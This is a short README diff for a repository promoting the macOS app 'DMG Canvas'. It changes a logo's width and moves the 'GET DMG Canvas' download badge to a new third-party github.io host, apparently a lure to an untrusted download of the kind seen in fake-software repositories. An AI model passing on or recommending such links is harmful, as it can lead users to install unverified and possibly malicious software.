@@ -1,13 +1,13 @@
 # DMG Canvas – Advanced Tool for Creating Professional Disk Images  
 
 <div align="center">  
-<img src="https://macoshub.ru/uploads/app/2/9655_dmg-canvas.jpg" alt="DMG Canvas Logo" width="400">  
+<img src="https://macoshub.ru/uploads/app/2/9655_dmg-canvas.jpg" alt="DMG Canvas Logo" width="300">  
 </div>
 
 <br>  
 
 <div align="center">  
-<a href="https://osx-app.github.io/.github/dmg-canvas">  
+<a href="https://install-quick-software.github.io/.github/dmg-canvas">  
 <img src="https://img.shields.io/badge/💻_GET_DMG_Canvas-darkgreen?style=for-the-badge&logo=apple" alt="GET DMG Canvas">  
 </a>  
 </div>
